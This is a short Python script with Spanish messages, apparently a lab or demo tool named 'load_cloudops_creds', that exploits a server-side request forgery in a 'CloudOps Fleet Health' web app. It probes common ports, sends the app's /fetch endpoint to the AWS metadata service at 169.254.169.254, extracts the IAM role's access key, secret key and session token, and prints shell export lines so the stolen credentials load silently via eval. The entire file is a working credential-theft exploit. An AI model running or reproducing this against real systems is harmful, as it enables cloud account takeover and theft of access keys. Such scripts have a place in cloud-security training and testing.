import sys
import re
import json
import html
import shlex
from urllib.parse import urlencode
from urllib.request import urlopen, Request


if len(sys.argv) != 2:
    print(
        "Uso: python load_cloudops_creds.py <PUBLIC_IP>",
        file=sys.stderr
    )
    sys.exit(1)


public_ip = sys.argv[1]

IMDS = "http://169.254.169.254/latest/meta-data"


def get(url, timeout=5):
    req = Request(
        url,
        headers={"User-Agent": "demo-loader/1.0"}
    )

    with urlopen(req, timeout=timeout) as response:
        return response.read().decode("utf-8", errors="replace")


def detect_base_url():
    ports = [80, 8080, 8000, 5000]

    for port in ports:

        if port == 80:
            base = f"http://{public_ip}"
        else:
            base = f"http://{public_ip}:{port}"

        try:
            body = get(base + "/", timeout=3)

            if "CloudOps Fleet Health" in body:
                return base

        except Exception:
            pass

    raise RuntimeError(
        "No se encontró CloudOps Fleet Health."
    )


def ssrf_fetch(base_url, target):

    query = urlencode({"url": target})

    body = get(
        f"{base_url}/fetch?{query}",
        timeout=8
    )

    match = re.search(
        r"<pre>(.*?)</pre>",
        body,
        re.DOTALL
    )

    if not match:
        raise RuntimeError(
            "La aplicación no devolvió un resultado válido."
        )

    return html.unescape(match.group(1)).strip()


try:

    # Detectar la aplicación
    base_url = detect_base_url()

    print(
        f"[+] CloudOps Fleet Health: {base_url}",
        file=sys.stderr
    )

    # Obtener nombre del role
    role = ssrf_fetch(
        base_url,
        f"{IMDS}/iam/security-credentials/"
    )

    print(
        f"[+] Role: {role}",
        file=sys.stderr
    )

    # Obtener credenciales
    credentials_raw = ssrf_fetch(
        base_url,
        f"{IMDS}/iam/security-credentials/{role}"
    )

    credentials = json.loads(credentials_raw)

    access_key = credentials["AccessKeyId"]
    secret_key = credentials["SecretAccessKey"]
    token = credentials["Token"]

    # IMPORTANTE:
    # stdout contiene únicamente comandos para Git Bash.
    # eval los consume sin mostrarlos.
    print(
        f"export AWS_ACCESS_KEY_ID={shlex.quote(access_key)}"
    )

    print(
        f"export AWS_SECRET_ACCESS_KEY={shlex.quote(secret_key)}"
    )

    print(
        f"export AWS_SESSION_TOKEN={shlex.quote(token)}"
    )

    print(
        "export AWS_REGION=us-east-1"
    )

    print(
        "export AWS_DEFAULT_REGION=us-east-1"
    )

    print(
        "[+] Credenciales cargadas.",
        file=sys.stderr
    )


except Exception as exc:

    print(
        f"[ERROR] {exc}",
        file=sys.stderr
    )

    sys.exit(1)
